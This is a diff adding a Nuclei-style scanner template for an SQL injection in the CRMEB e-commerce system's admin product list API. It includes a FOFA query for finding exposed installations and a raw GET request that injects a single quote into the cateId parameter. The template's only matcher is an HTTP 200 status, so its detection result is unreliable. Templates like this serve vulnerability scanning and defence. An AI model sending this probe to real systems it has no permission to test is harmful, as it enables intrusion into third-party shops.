@@ -1,0 +1,19 @@
+id: poc-gkercdtukmpg0mo0
+info:
+  name: CRMEB开源电商系统productlist 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gkercdtukmpg0mo0'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gkercdtukmpg0mo0
+    fofa: body="/wap/first/zsff/iconfont/iconfont.css" || body="CRMEB"
+http:
+- raw:
+  - GET api/admin/store/product/list?page=1&limit=20&cateId=1'&keywords=&type=2&temp=1741250313 HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
